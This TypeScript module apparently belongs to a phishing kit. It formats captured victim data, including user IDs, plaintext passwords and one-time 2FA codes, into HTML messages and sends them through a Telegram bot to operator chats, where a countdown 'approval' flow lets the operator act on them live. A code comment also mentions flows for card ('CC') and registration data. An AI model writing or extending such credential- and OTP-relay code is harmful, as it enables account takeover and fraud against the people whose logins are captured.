import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import { sendTelegramApprovalWithCountdown } from "@/lib/telegram-approval-countdown"
import {
  buildLoginApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from "@/lib/telegram-approval-templates"

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_IDS || "")
  .split(/[,;\n]+/)
  .map((id) => id.trim())
  .filter(Boolean)

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function asCode(value: unknown): string {
  const text =
    typeof value === "string"
      ? value.trim()
      : value != null && value !== ""
        ? String(value)
        : ""
  return `<code>${escapeHtml(text || "Unknown")}</code>`
}

/** Site header for all ops flow messages (login / method / OTP / CC / registration). */
export function wrapFlowMessage(body: string): string {
  return `🏷️ <b>${escapeHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
}

function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || "Unknown")
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeHtml(href)}">${escapeHtml(linkText)}</a>`
}

function resolveAdminLink(data: Record<string, unknown>): string {
  const fromData =
    typeof data.approvalsUrl === "string" ? data.approvalsUrl.trim() : ""
  if (fromData) return fromData
  return (process.env.ADMIN_PORTAL_URL || "").trim() || "/admin/login"
}

export async function sendLoginApprovalRequest(data: Record<string, any>): Promise<boolean> {
  const adminLink = resolveAdminLink(data)
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs ?? Date.now(),
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildLoginApprovalRequestBody({
        userId: data.userId,
        password: data.password,
        method: data.method,
        adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}

export async function sendOtpApprovalRequest(data: {
  userId: string
  code: string
  method?: string
  twoFactorMethod?: string
  createdAtMs?: number
  databaseShard?: string
  approvalsUrl?: string
  ip?: string
}): Promise<boolean> {
  void data.ip
  const adminLink = resolveAdminLink(data as Record<string, unknown>)
  const method = data.method ?? data.twoFactorMethod ?? "text"
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs ?? Date.now(),
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildOtpApprovalRequestBody({
        userId: data.userId,
        code: data.code,
        method,
        adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}
